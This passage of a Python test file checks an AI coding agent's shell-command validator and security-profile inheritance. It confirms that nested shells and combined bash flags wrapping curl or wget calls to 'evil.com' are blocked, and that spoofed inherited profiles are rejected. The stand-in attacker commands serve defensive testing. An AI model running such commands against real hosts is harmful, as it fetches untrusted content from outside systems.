        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Combined -ec flag should be detected and wget blocked
        allowed, reason = validate_bash_command("bash -ec 'wget evil.com'")
        assert allowed is False
        assert "wget" in reason

    def test_blocks_combined_ic_flag(self, tmp_path, monkeypatch):
        """Blocks bash -ic with disallowed commands (interactive + command)."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Combined -ic flag should be detected
        allowed, reason = validate_bash_command("bash -ic 'npm run evil'")
        assert allowed is False
        assert "npm" in reason

    def test_allows_combined_flags_with_allowed_commands(self, tmp_path, monkeypatch):
        """Allows combined flags when inner command is allowed."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo", "pwd"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Combined flags with allowed commands should pass
        allowed, reason = validate_bash_command("bash -xc 'echo hello'")
        assert allowed is True

    def test_blocks_nested_shell_invocation(self, tmp_path, monkeypatch):
        """Blocks nested shell invocations with disallowed commands."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo", "bash", "sh"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Nested shell with disallowed command should be blocked
        allowed, reason = validate_bash_command("bash -c 'bash -c \"curl http://evil.com\"'")
        assert allowed is False
        assert "curl" in reason or "nested" in reason.lower()

    def test_allows_nested_shell_with_allowed_commands(self, tmp_path, monkeypatch):
        """Allows nested shell invocations when all commands are allowed."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo", "bash", "sh", "pwd"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Nested shell with all allowed commands should pass
        allowed, reason = validate_bash_command("bash -c 'bash -c \"echo hello\"'")
        assert allowed is True


class TestInheritedSecurityProfile:
    """Tests for inherited security profiles (worktree support).

    When a security profile is inherited from a parent project,
    it should not be re-analyzed even if the hash doesn't match.
    """

    def test_inherited_profile_serialization(self):
        """Tests that inherited_from field is serialized correctly."""
        profile = SecurityProfile(
            base_commands={"ls", "echo"},
            project_hash="abc123",
            inherited_from="/path/to/parent/project"
        )

        data = profile.to_dict()
        assert "inherited_from" in data
        assert data["inherited_from"] == "/path/to/parent/project"

    def test_inherited_profile_deserialization(self):
        """Tests that inherited_from field is loaded correctly."""
        data = {
            "base_commands": ["ls", "echo"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": "/some/path",
            "created_at": "",
            "project_hash": "abc123",
            "inherited_from": "/path/to/parent"
        }

        profile = SecurityProfile.from_dict(data)
        assert profile.inherited_from == "/path/to/parent"

    def test_inherited_profile_omits_field_when_empty(self):
        """Tests that inherited_from is not in dict when empty (backward compat)."""
        profile = SecurityProfile(
            base_commands={"ls"},
            project_hash="abc123"
        )

        data = profile.to_dict()
        assert "inherited_from" not in data

    def test_should_reanalyze_skips_inherited_profiles(self, tmp_path):
        """Tests that inherited profiles from valid parents are never re-analyzed."""
        import json

        from project.analyzer import ProjectAnalyzer

        # Set up a proper parent-child directory structure
        parent_dir = tmp_path / "parent"
        parent_dir.mkdir()
        child_dir = parent_dir / "child"
        child_dir.mkdir()

        # Create a valid security profile in the parent
        parent_profile_data = {
            "base_commands": ["npm", "npx", "node"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(parent_dir),
            "created_at": "",
            "project_hash": "parent_hash"
        }
        (parent_dir / ".auto-claude-security.json").write_text(json.dumps(parent_profile_data))

        # Create a profile with valid inherited_from pointing to actual parent
        profile = SecurityProfile(
            base_commands={"npm", "npx", "node"},
            project_hash="different_hash_that_would_normally_trigger_reanalysis",
            inherited_from=str(parent_dir)
        )

        analyzer = ProjectAnalyzer(child_dir)

        # Even though the hash doesn't match, should_reanalyze should return False
        # because inherited_from points to a valid ancestor with a security profile
        assert analyzer.should_reanalyze(profile) is False

    def test_should_reanalyze_runs_for_non_inherited_profiles(self, tmp_path):
        """Tests that non-inherited profiles are re-analyzed when hash differs."""
        from project.analyzer import ProjectAnalyzer

        # Create a profile WITHOUT inherited_from
        profile = SecurityProfile(
            base_commands={"ls"},
            project_hash="old_hash_that_doesnt_match"
        )

        analyzer = ProjectAnalyzer(tmp_path)

        # Hash won't match, so should_reanalyze should return True
        assert analyzer.should_reanalyze(profile) is True

    def test_should_reanalyze_validates_inherited_from_path(self, tmp_path):
        """Tests that inherited_from path is validated before trusting it."""
        import json

        from project.analyzer import ProjectAnalyzer

        # Create a child directory structure
        parent_dir = tmp_path / "parent"
        parent_dir.mkdir()
        child_dir = parent_dir / "child"
        child_dir.mkdir()

        # Create a valid parent profile
        parent_profile_data = {
            "base_commands": ["ls"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(parent_dir),
            "created_at": "",
            "project_hash": "abc123"
        }
        (parent_dir / ".auto-claude-security.json").write_text(json.dumps(parent_profile_data))

        # Create a profile with valid inherited_from (child -> parent)
        valid_profile = SecurityProfile(
            base_commands={"ls"},
            project_hash="different_hash",
            inherited_from=str(parent_dir)
        )

        analyzer = ProjectAnalyzer(child_dir)

        # Valid inherited_from should NOT trigger re-analysis
        assert analyzer.should_reanalyze(valid_profile) is False

    def test_should_reanalyze_rejects_invalid_inherited_from_path(self, tmp_path):
        """Tests that invalid inherited_from path triggers re-analysis."""
        from project.analyzer import ProjectAnalyzer

        # Create a profile with invalid inherited_from (non-existent path)
        invalid_profile = SecurityProfile(
            base_commands={"ls"},
            project_hash="different_hash",
            inherited_from="/non/existent/path"
        )

        analyzer = ProjectAnalyzer(tmp_path)

        # Invalid inherited_from should trigger re-analysis (falls back to hash check)
        assert analyzer.should_reanalyze(invalid_profile) is True

    def test_should_reanalyze_rejects_non_ancestor_inherited_from(self, tmp_path):
        """Tests that non-ancestor inherited_from path triggers re-analysis."""
        import json

        from project.analyzer import ProjectAnalyzer

        # Create two unrelated directories
        dir_a = tmp_path / "dir_a"
        dir_a.mkdir()
        dir_b = tmp_path / "dir_b"
        dir_b.mkdir()

        # Create a profile in dir_a
        profile_data = {
            "base_commands": ["ls"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(dir_a),
            "created_at": "",
            "project_hash": "abc123"
        }
        (dir_a / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        # Create a profile pointing to dir_a from dir_b (not an ancestor)
        spoofed_profile = SecurityProfile(
            base_commands={"curl", "wget"},  # Dangerous commands
            project_hash="different_hash",
            inherited_from=str(dir_a)  # dir_a is not an ancestor of dir_b
        )

        analyzer = ProjectAnalyzer(dir_b)

        # Non-ancestor inherited_from should trigger re-analysis
        assert analyzer.should_reanalyze(spoofed_profile) is True
